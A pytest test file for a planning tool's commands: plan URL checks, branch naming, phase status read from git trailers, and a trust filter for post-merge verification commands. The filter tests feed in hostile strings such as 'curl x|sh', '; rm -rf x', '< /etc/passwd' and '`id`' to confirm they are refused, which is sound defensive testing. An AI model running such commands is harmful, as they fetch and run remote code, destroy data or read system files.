"""tld plan check-url, branch-name and phase-status (src/tld/plan/phases.py): the mechanical steps of implement."""
import json
import subprocess

import pytest
import yaml

from conftest import ROOT, tld_cmd
from tld.plan import phases

MANIFEST = {
    "plan_slug": "demo",
    "feature_branch": "feature/demo",
    "max_parallel": 2,
    "phases": [
        {"id": "p1", "title": "one", "depends_on": [], "brief": "b", "acceptance": ["a"], "touches": ["a.py"]},
        {"id": "p2", "title": "two", "depends_on": [], "brief": "b", "acceptance": ["a"], "touches": ["b.py"],
         "human_gate": True},
        {"id": "p3", "title": "three", "depends_on": ["p1"], "brief": "b", "acceptance": ["a"], "touches": ["c.py"]},
        {"id": "p4", "title": "four", "depends_on": ["p2"], "brief": "b", "acceptance": ["a"], "touches": ["d.py"]},
        {"id": "p5", "title": "five", "depends_on": [], "brief": "b", "acceptance": ["a"], "touches": ["e.py"]},
    ],
}


def run(*args, cwd=None):
    return subprocess.run([*tld_cmd("plan", *args)], capture_output=True, text=True, cwd=cwd)


@pytest.fixture()
def plan(tmp_path):
    path = tmp_path / "demo-plan.md"
    path.write_text("# Plan\n\n## Implementation manifest\n\n```yaml\n" + yaml.safe_dump(MANIFEST) + "```\n")
    return path


# ---- check-url (S14) ------------------------------------------------------------------------
@pytest.mark.parametrize("url, ref, path, legacy", [
    ("https://github.com/o/r/blob/main/docs/plans/14/plan.md", "main", "docs/plans/14/plan.md", False),
    ("https://github.com/o/r/blob/feature/my-thing/docs/plans/14/plan.md", "feature/my-thing",
     "docs/plans/14/plan.md", False),
    ("https://github.com/o/r/blob/fix/a-b/docs/plans/3/plan.md", "fix/a-b", "docs/plans/3/plan.md", False),
    ("https://github.com/o/r/blob/main/docs/plans/x-plan.md", "main", "docs/plans/x-plan.md", True),
    ("https://github.com/o/r/blob/plan/x-y/docs/plans/x-y-plan.md", "plan/x-y", "docs/plans/x-y-plan.md", True),
    ("https://github.com/o/r/blob/plan/tags/docs/tags-plan.md", "plan/tags", "docs/tags-plan.md", True),
    ("https://github.com/O/R/blob/plan/x/p.md", "plan/x", "p.md", True),
])
def test_check_url_accepts_main_feature_and_legacy_plan_branches_of_this_repo(url, ref, path, legacy):
    r = run("check-url", url, "--repo", "o/r")
    assert r.returncode == 0, r.stderr
    out = json.loads(r.stdout)
    assert out["ref"] == ref and out["path"] == path and out["legacy"] is legacy
    assert ("old-layout plans are deprecated" in r.stderr) is legacy


@pytest.mark.parametrize("url, message", [
    ("https://github.com/other/r/blob/main/p.md", "not in this repository"),
    ("https://github.com/o/r/blob/feature/x/p.md", "the plan must be at docs/plans/<n>/plan.md on 'main'"),
    ("https://github.com/o/r/blob/claude/abc/p.md", "the plan must be at docs/plans/<n>/plan.md"),
    ("https://github.com/o/r/blob/plans/x/p.md", "the plan must be at docs/plans/<n>/plan.md"),
    ("https://github.com/o/r/blob/feature/Upper/docs/plans/3/plan.md", "not on 'feature/Upper'"),
    ("https://github.com/o/r/blob/feature/x--p1/docs/plans/3/plan.md", "not on 'feature/x--p1'"),
    ("https://github.com/o/r/blob/plan/Bad_Slug/p.md", "kebab-case slug"),
    ("https://github.com/o/r/blob/main/../x.md", "'..'"),
    ("https://gitlab.com/o/r/blob/main/p.md", "not a plan URL"),
    ("https://github.com/o/r/tree/main/p.md", "not a plan URL"),
])
def test_check_url_refuses_everything_else(url, message):
    r = run("check-url", url, "--repo", "o/r")
    assert r.returncode == 1 and r.stderr.startswith("plan: ") and message in r.stderr


def test_check_url_main_branch_and_origin(tmp_path):
    assert run("check-url", "https://github.com/o/r/blob/trunk/p.md", "--repo", "o/r", "--main", "trunk").returncode == 0
    assert run("check-url", "https://github.com/o/r/blob/main/p.md", "--repo", "o/r", "--main", "trunk").returncode == 1
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "remote", "add", "origin", "git@github.com:o/r.git"], cwd=tmp_path, check=True)
    assert run("check-url", "https://github.com/o/r/blob/main/p.md", cwd=tmp_path).returncode == 0
    assert run("check-url", "https://github.com/x/r/blob/main/p.md", cwd=tmp_path).returncode == 1


# ---- branch-name (C12) ----------------------------------------------------------------------
@pytest.mark.parametrize("args, expected", [
    (["--plan-slug", "deny-with-feedback"], "plan/deny-with-feedback"),
    (["--review-slug", "repo-2026-11-11"], "review/repo-2026-11-11"),
    (["--manifest", "{plan}"], "feature/demo"),
    (["--manifest", "{plan}", "--phase", "p2"], "feature/demo--p2"),
    (["--manifest", "{plan}", "--phase", "p2", "--rev", "1"], "feature/demo--p2-rev1"),
    (["--manifest", "{plan}", "--fix", "3"], "feature/demo--fix-3"),
])
def test_branch_names(plan, args, expected):
    r = run("branch-name", *[a.replace("{plan}", str(plan)) for a in args])
    assert r.returncode == 0, r.stderr
    assert r.stdout == expected + "\n"


@pytest.mark.parametrize("args, message", [
    (["--plan-slug", "Not A Slug"], "kebab-case"),
    (["--manifest", "{plan}", "--phase", "p9"], "no phase 'p9'"),
    (["--manifest", "{plan}", "--rev", "1"], "--rev needs --phase"),
    (["--manifest", "{plan}", "--fix", "1", "--phase", "p1"], "--fix takes no --phase"),
    (["--manifest", "{plan}", "--fix", "0"], "count from 1"),
])
def test_branch_name_errors(plan, args, message):
    r = run("branch-name", *[a.replace("{plan}", str(plan)) for a in args])
    assert r.returncode == 1 and message in r.stderr


def test_branch_name_needs_a_valid_manifest(tmp_path):
    bad = tmp_path / "m.yaml"
    bad.write_text(yaml.safe_dump({"plan_slug": "x", "phases": []}))
    r = run("branch-name", "--manifest", str(bad))
    assert r.returncode == 1 and "run tld plan validate-manifest" in r.stderr


# ---- phase-status ---------------------------------------------------------------------------
def repo_with_trailers(root, *phase_ids):
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=root, check=True)
    for msg in ["init", *[f"Merge demo {p}: t\n\nPlan-Phase: demo/{p}" for p in phase_ids],
                "unrelated\n\nPlan-Phase: other/p5"]:
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q",
                        "--allow-empty", "-m", msg], cwd=root, check=True)
    return root


def status(plan, root, *args):
    r = run("phase-status", str(plan), "--repo", str(root), *args)
    assert r.returncode == 0, r.stderr
    return json.loads(r.stdout)


def test_phase_status_fresh_run(plan, tmp_path):
    (tmp_path / "r").mkdir()
    repo = repo_with_trailers(tmp_path / "r")
    s = status(plan, repo)
    assert s["done"] == [] and s["ready"] == ["p1", "p2", "p5"] and s["waiting"] == ["p3", "p4"]
    assert s["start"] == ["p1", "p2"] and s["all_done"] is False


def test_phase_status_with_done_running_and_a_gate(plan, tmp_path):
    (tmp_path / "r").mkdir()
    repo = repo_with_trailers(tmp_path / "r", "p1", "p2")
    s = status(plan, repo, "--running", "p5")
    assert s["done"] == ["p1", "p2"] and s["gated"] == ["p2"]
    assert s["ready"] == ["p3"] and s["waiting"] == ["p4"] and s["start"] == ["p3"]
    s = status(plan, repo, "--running", "p5", "--approved", "p2")
    assert s["gated"] == [] and s["ready"] == ["p3", "p4"] and s["start"] == ["p3"]


def test_phase_status_all_done_and_errors(plan, tmp_path):
    (tmp_path / "r").mkdir()
    repo = repo_with_trailers(tmp_path / "r", "p1", "p2", "p3", "p4", "p5")
    assert status(plan, repo)["all_done"] is True
    r = run("phase-status", str(plan), "--repo", str(repo), "--running", "nope")
    assert r.returncode == 1 and "no phase 'nope'" in r.stderr
    r = run("phase-status", str(plan), "--repo", str(repo), "--ref", "no-such-ref")
    assert r.returncode == 1 and "git log no-such-ref failed" in r.stderr


# ---- phase-status with real merges: revert on red (C1) and durable gate approvals (C13) -----------------------
def git(root, *args):
    r = subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args], cwd=root,
                       capture_output=True, text=True)
    assert r.returncode == 0, r.stdout + r.stderr
    return r.stdout.strip()


@pytest.fixture()
def feature_repo(tmp_path):
    root = tmp_path / "f"
    root.mkdir()
    git(root, "init", "-q", "-b", "main")
    git(root, "commit", "-q", "--allow-empty", "-m", "init")
    git(root, "checkout", "-q", "-b", "feature/demo")
    return root


def phase_commit(root, pid, name, text):
    git(root, "checkout", "-q", "-B", f"feature/demo--{pid}", "feature/demo")
    (root / name).write_text(text)
    git(root, "add", name)
    git(root, "commit", "-q", "-m", f"{pid} work\n\nPlan-Phase: demo/{pid}")
    git(root, "checkout", "-q", "feature/demo")


def merge_phase(root, pid, branch=None):
    git(root, "merge", "-q", "--no-ff", branch or f"feature/demo--{pid}", "-m",
        f"Merge demo {pid}: t\n\nPlan-Phase: demo/{pid}")


def test_only_the_merge_on_the_feature_branch_counts_not_the_workers_tip_commit(plan, feature_repo):
    phase_commit(feature_repo, "p1", "a.py", "1\n")
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == []
    git(feature_repo, "merge", "-q", "--no-ff", "feature/demo--p1", "-m", "Merge without a trailer")
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == []  # the tip's trailer is a second parent
    git(feature_repo, "reset", "-q", "--hard", "HEAD~1")
    merge_phase(feature_repo, "p1")
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == ["p1"]


def test_a_reverted_merge_is_not_done_and_a_revert_of_the_revert_makes_it_done_again(plan, feature_repo):
    phase_commit(feature_repo, "p1", "a.py", "1\n")
    merge_phase(feature_repo, "p1")
    merge_sha = git(feature_repo, "rev-parse", "HEAD")
    git(feature_repo, "revert", "--no-edit", "-m", "1", merge_sha)
    s = status(plan, feature_repo, "--ref", "feature/demo")
    assert s["done"] == [] and "p1" in s["ready"]
    # The recovery the playbook names for a red merge that was already pushed: revert the revert, then merge the fix.
    revert_sha = git(feature_repo, "rev-parse", "HEAD")
    git(feature_repo, "revert", "--no-edit", revert_sha)
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == ["p1"]
    git(feature_repo, "checkout", "-q", "feature/demo--p1")
    (feature_repo / "a.py").write_text("1 fixed\n")
    git(feature_repo, "commit", "-q", "-am", "p1 fix\n\nPlan-Phase: demo/p1")
    git(feature_repo, "checkout", "-q", "feature/demo")
    merge_phase(feature_repo, "p1")  # merges cleanly: no modify/delete conflict
    assert (feature_repo / "a.py").read_text() == "1 fixed\n"
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == ["p1"]


def test_re_merging_after_a_plain_revert_conflicts_which_is_why_the_playbook_resets_locally(plan, feature_repo):
    phase_commit(feature_repo, "p1", "a.py", "1\n")
    merge_phase(feature_repo, "p1")
    git(feature_repo, "revert", "--no-edit", "-m", "1", "HEAD")
    git(feature_repo, "checkout", "-q", "feature/demo--p1")
    (feature_repo / "a.py").write_text("1 fixed\n")
    git(feature_repo, "commit", "-q", "-am", "p1 fix")
    git(feature_repo, "checkout", "-q", "feature/demo")
    r = subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "merge", "--no-ff",
                        "feature/demo--p1", "-m", "again"], cwd=feature_repo, capture_output=True, text=True)
    assert r.returncode != 0 and "CONFLICT" in r.stdout
    git(feature_repo, "merge", "--abort")
    # The playbook's way: a red merge that is not pushed yet is undone with reset, and the fix merges cleanly.
    git(feature_repo, "reset", "-q", "--hard", "HEAD~1")
    git(feature_repo, "reset", "-q", "--hard", "HEAD~1")
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == []
    merge_phase(feature_repo, "p1")
    assert (feature_repo / "a.py").read_text() == "1 fixed\n"
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == ["p1"]


def test_a_revert_commit_with_a_plan_phase_trailer_does_not_count(plan, feature_repo):
    phase_commit(feature_repo, "p1", "a.py", "1\n")
    merge_phase(feature_repo, "p1")
    sha = git(feature_repo, "rev-parse", "HEAD")
    git(feature_repo, "revert", "--no-commit", "-m", "1", sha)
    git(feature_repo, "commit", "-q", "-m", f"Revert p1\n\nThis reverts commit {sha[:12]}.\n\nPlan-Phase: demo/p1")
    assert status(plan, feature_repo, "--ref", "feature/demo")["done"] == []


def test_gate_approval_is_read_from_an_empty_commit_trailer_and_a_later_revision_is_gated_again(plan, feature_repo):
    phase_commit(feature_repo, "p2", "b.py", "2\n")
    merge_phase(feature_repo, "p2")
    s = status(plan, feature_repo, "--ref", "feature/demo")
    assert s["gated"] == ["p2"] and s["approved"] == [] and "p4" in s["waiting"]
    git(feature_repo, "commit", "-q", "--allow-empty", "-m", "Approve demo p2\n\nPlan-Gate-Approved: demo/p2")
    s = status(plan, feature_repo, "--ref", "feature/demo")
    assert s["gated"] == [] and s["approved"] == ["p2"] and "p4" in s["ready"]
    # An approval for another plan, or one a worker wrote on its phase branch, does not count.
    git(feature_repo, "checkout", "-q", "-B", "feature/demo--p2-rev1", "feature/demo")
    (feature_repo / "b.py").write_text("2 rev\n")
    git(feature_repo, "commit", "-q", "-am", "rev\n\nPlan-Gate-Approved: demo/p2\nPlan-Gate-Approved: other/p2")
    git(feature_repo, "checkout", "-q", "feature/demo")
    merge_phase(feature_repo, "p2", "feature/demo--p2-rev1")
    s = status(plan, feature_repo, "--ref", "feature/demo")
    assert s["gated"] == ["p2"] and s["approved"] == []
    assert status(plan, feature_repo, "--ref", "feature/demo", "--approved", "p2")["approved"] == ["p2"]


def test_phase_status_reports_plan_started(plan, feature_repo):
    git(feature_repo, "commit", "-q", "--allow-empty", "-m", "work")
    assert status(plan, feature_repo)["started"] is False
    (feature_repo / "plan.md").write_text("plan\n")
    git(feature_repo, "add", "plan.md")
    git(feature_repo, "commit", "-q", "-m", "Start plan\n\nPlan-Started: demo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    s = status(plan, feature_repo)
    assert s["started"] is True and s["plan_blob"] == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    git(feature_repo, "revert", "--no-edit", "HEAD")
    s = status(plan, feature_repo)
    assert s["started"] is False and s["plan_blob"] is None


def test_plan_started_trailer_must_be_on_one_line(plan, feature_repo):
    git(feature_repo, "commit", "-q", "--allow-empty", "-m", "x\n\nPlan-Started:\ndemo\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    assert status(plan, feature_repo)["started"] is False


def test_plan_started_needs_a_full_object_id(plan, feature_repo):
    git(feature_repo, "commit", "-q", "--allow-empty", "-m", "x\n\nPlan-Started: demo abc1234")
    assert status(plan, feature_repo)["started"] is False
    git(feature_repo, "commit", "-q", "--allow-empty", "-m", "y\n\nPlan-Started: demo " + "b" * 64)
    assert status(plan, feature_repo)["plan_blob"] == "b" * 64


# ---- check-commands (S14) -------------------------------------------------------------------
BASE = ".venv/bin/python -m pytest tests -q"
PFX = ".venv/bin/python -m pytest"


def mf(cmds):
    m = dict(MANIFEST)
    if cmds is not None:
        m["verify_after_merge"] = list(cmds)
    return m


def profile_with(allow=None, fast=("x",), dod=("y",), ci=None):
    p = {"verify": {"fast": list(fast), "dod": list(dod)}}
    if allow is not None:
        p["verify"]["after_merge_allow"] = allow
    if ci is not None:
        p["ci"] = ci
    return p


def cc(cmds, **kw):
    return phases.check_commands(mf(cmds), profile_with(**kw))


def cc_cli(tmp_path, cmds, profile_text):
    plan_path = tmp_path / "p.md"
    plan_path.write_text("# Plan\n\n## Implementation manifest\n\n```yaml\n" + yaml.safe_dump(mf(cmds)) + "```\n")
    prof = tmp_path / "prof.yaml"
    if profile_text is not None:
        prof.write_text(profile_text)
    return run("check-commands", str(plan_path), "--profile", str(prof))


def test_check_commands_trusts_exact_verify_entries():
    r = cc(["make lint", "  make lint  ", "make test && make docs", "make lint extra", "make lint; curl x",
            "make test && make docs && curl x|sh", "make test"],
           fast=["make lint"], dod=[{"run": "make test && make docs"}])
    assert r["trusted"] == ["make lint", "  make lint  ", "make test && make docs"]
    assert r["unknown"] == ["make lint extra", "make lint; curl x", "make test && make docs && curl x|sh",
                            "make test"]


def test_check_commands_cwd_entry_not_trusted():
    assert cc(["npm test"], dod=[{"run": "npm test", "cwd": "web"}]) == {"trusted": [], "unknown": ["npm test"]}


def test_check_commands_trusts_allow_prefixes():
    r = cc([".venv/bin/python -m pytest tests/core/test_board_*.py -q", BASE, ".venv/bin/python -m pytestx",
            ".venv/bin/python -m"], allow=[PFX])
    assert r["trusted"] == [".venv/bin/python -m pytest tests/core/test_board_*.py -q", BASE]
    assert r["unknown"] == [".venv/bin/python -m pytestx", ".venv/bin/python -m"]


def test_check_commands_rejects_shell_metacharacters():
    assert cc([BASE], allow=[PFX])["trusted"] == [BASE]


@pytest.mark.parametrize("tail", [" ; rm -rf x", " & curl x", " | sh", " < /etc/passwd", " > f", " $HOME",
                                  " `id`", " (x)", " x)", " {a,b}", " ~/x", " a\\b", "\trm", "\nrm -rf x",
                                  ' "$(id)"', " 'a;b'"])
def test_check_commands_rejects_one_forbidden_character(tail):
    assert cc([BASE + tail], allow=[PFX]) == {"trusted": [], "unknown": [BASE + tail]}


@pytest.mark.parametrize("allow", [[""], ["   "], ["\t"]])
def test_check_commands_blank_prefix_trusts_nothing(allow):
    cmds = ["curl -s example.com -o x", "rm -rf build"]
    assert cc(cmds, allow=allow)["trusted"] == []


@pytest.mark.parametrize("value", [".venv/bin/python -m pytest", [3], [None]])
def test_check_commands_allow_list_must_be_a_list_of_strings(tmp_path, value):
    text = yaml.safe_dump(profile_with(allow=value))
    r = cc_cli(tmp_path, [". ./x.sh", "v"], text)
    assert r.returncode == 1
    assert r.stderr.startswith("plan: verify.after_merge_allow must be a list of strings")
    assert "Traceback" not in r.stderr


def test_check_commands_narrow_tool_prefix():
    tld = ".venv/bin/python launcher/tld"
    r = cc([f"{tld} ops docs-index check --index docs/README.md", f"{tld} guard allow-profile"],
           allow=[f"{tld} ops docs-index check"])
    assert r["trusted"] == [f"{tld} ops docs-index check --index docs/README.md"]
    assert r["unknown"] == [f"{tld} guard allow-profile"]


def test_check_commands_dispatch_needs_dispatchable():
    ci = {"dispatchable": [{"workflow": "macos-tests.yml", "use_when": "x"}]}
    assert cc(["dispatch macos-tests.yml"], ci=ci)["trusted"] == ["dispatch macos-tests.yml"]
    assert cc(["dispatch macos-tests.yml"]) == {"trusted": [], "unknown": ["dispatch macos-tests.yml"]}


@pytest.mark.parametrize("cmd", ["dispatch macos-tests.yml extra", "dispatch  macos-tests.yml",
                                 "dispatch\tmacos-tests.yml", "dispatch macos-tests.yml; curl x",
                                 "dispatch macos-tests.yml && curl x|sh", "dispatch macos",
                                 "Dispatch macos-tests.yml", "dispatch other.yml"])
def test_check_commands_dispatch_variants_are_unknown(cmd):
    ci = {"dispatchable": [{"workflow": "macos-tests.yml", "use_when": "x"}]}
    assert cc([cmd], ci=ci)["unknown"] == [cmd]


def test_check_commands_minimal_profile_shapes():
    assert cc(["a", "b"], fast=["a"], dod=["z"]) == {"trusted": ["a"], "unknown": ["b"]}
    assert cc(["a"], fast=[{"cwd": "x"}, 3], dod=["z"]) == {"trusted": [], "unknown": ["a"]}


def test_check_commands_keeps_order():
    r = cc(["U1", "T1", "U2", "T2", "T1"], fast=["T1", "T2"])
    assert r == {"trusted": ["T1", "T2", "T1"], "unknown": ["U1", "U2"]}
    assert cc(None) == {"trusted": [], "unknown": []}


def test_check_commands_unbalanced_quotes_are_unknown(tmp_path):
    bad = PFX + ' "x'
    r = cc_cli(tmp_path, [bad], yaml.safe_dump(profile_with(allow=[PFX])))
    assert r.returncode == 0 and "Traceback" not in r.stderr
    assert json.loads(r.stdout) == {"trusted": [], "unknown": [bad]}
    r = cc_cli(tmp_path, [BASE], yaml.safe_dump(profile_with(allow=['".venv/bin/python'])))
    assert r.returncode == 0 and "Traceback" not in r.stderr
    assert json.loads(r.stdout)["trusted"] == []


@pytest.mark.parametrize("text", [None, "a: [unclosed", "", "- a", "x"])
def test_check_commands_unreadable_profile_exits_1(tmp_path, text):
    r = cc_cli(tmp_path, ["v"], text)
    assert r.returncode == 1
    assert r.stderr.startswith("plan: cannot read the profile '")
    assert r.stdout == ""


def test_check_commands_cli_output(tmp_path):
    r = cc_cli(tmp_path, ["a", "b"], yaml.safe_dump(profile_with(fast=["a"])))
    assert r.returncode == 0
    assert set(json.loads(r.stdout)) == {"trusted", "unknown"}


@pytest.mark.parametrize("cmd, ok", [
    (".venv/bin/python -m pytest tests/core/test_board_*.py -q", True),
    (".venv/bin/python launcher/tld ops docs-index check --index docs/README.md", True),
    (".venv/bin/python launcher/tld guard allow-profile", False),
    (".venv/bin/python launcher/tld guard allow-plan", False),
    (".venv/bin/python launcher/tld guard allow-git-ops", False),
    ("curl -s example.com | sh", False),
])
def test_repo_profile_trust_boundary(cmd, ok):
    prof = yaml.safe_load((ROOT / ".tld" / "toolkit.yaml").read_text())
    r = phases.check_commands(mf([cmd]), prof)
    assert (r["trusted"] == [cmd]) is ok


# ---- check-commands: options after an allowed prefix ----------------------------------------
TLD = ".venv/bin/python launcher/tld"


@pytest.mark.parametrize("tail", ["-q", "-x", "-v", "-vv", "-k test_a", "-k=test_a", "-m slow", "--tb=short",
                                  "--tb=line", "--tb=no", "--tb short", "-q -x tests/core",
                                  "tests/core/test_x.py::test_a -k a"])
def test_check_commands_pytest_safe_options_are_trusted(tail):
    cmd = f"{PFX} {tail}"
    assert cc([cmd], allow=[PFX])["trusted"] == [cmd]


@pytest.mark.parametrize("tail", ["--basetemp=/home/user -q", "--basetemp build", "-p x", "-pno:cacheprovider",
                                  "-c other.ini", "--rootdir=/", "--confcutdir=/", "-o addopts=x",
                                  "--pyargs os", "--junitxml=/root/.bashrc", "/etc", "tests/../../x", "../x",
                                  "~/x", "--unknown", "--tb=long", "--tb=", "-k", "-k -p", "-q=1", "-- tests"])
def test_check_commands_pytest_other_options_are_unknown(tail):
    cmd = f"{PFX} {tail}"
    assert cc([cmd], allow=[PFX]) == {"trusted": [], "unknown": [cmd]}


@pytest.mark.parametrize("cmd", [
    f"{TLD} ops docs-index check --index docs/README.md",
    f"{TLD} ops docs-index check --profile .tld/toolkit.yaml --json --strict",
    f"{TLD} profile validate .tld/toolkit.yaml --no-file-checks",
    f"{TLD} plan validate-manifest tests/fixtures/p.yaml --profile tests/fixtures/t.yaml --ref feature/x",
])
def test_check_commands_tld_safe_options_are_trusted(cmd):
    prof = yaml.safe_load((ROOT / ".tld" / "toolkit.yaml").read_text())
    assert phases.check_commands(mf([cmd]), prof)["trusted"] == [cmd]


@pytest.mark.parametrize("cmd", [
    f"{TLD} ops docs-index check --root /",
    f"{TLD} ops docs-index check --index /etc/passwd",
    f"{TLD} ops docs-index check --index ../README.md",
    f"{TLD} ops docs-index check --write",
    f"{TLD} profile validate /etc/x.yaml",
    f"{TLD} plan validate-manifest p.yaml --ref -x",
])
def test_check_commands_tld_other_options_are_unknown(cmd):
    prof = yaml.safe_load((ROOT / ".tld" / "toolkit.yaml").read_text())
    assert phases.check_commands(mf([cmd]), prof)["unknown"] == [cmd]


def test_check_commands_other_program_takes_no_options():
    assert cc(["npm test web", "npm test --watch"], allow=["npm test"]) == {
        "trusted": ["npm test web"], "unknown": ["npm test --watch"]}


@pytest.mark.parametrize("tail", ["*", "@args.txt", "-k *", "-k @x", "-m t?", "tests/.?/.?/x", "tests/*/x",
                                  "tests/?x", "tests/[.]", "t*/x", "tests/core/*"])
def test_check_commands_shell_expansion_is_unknown(tail):
    cmd = f"{PFX} {tail}"
    assert cc([cmd], allow=[PFX]) == {"trusted": [], "unknown": [cmd]}


def test_check_commands_argfile_path_is_unknown():
    prof = yaml.safe_load((ROOT / ".tld" / "toolkit.yaml").read_text())
    cmd = f"{TLD} profile validate --profile @x"
    assert phases.check_commands(mf([cmd]), prof)["unknown"] == [cmd]


def test_check_commands_non_string_entry_is_unknown():
    assert cc([{"run": "x"}, 3], allow=[PFX]) == {"trusted": [], "unknown": [{"run": "x"}, 3]}
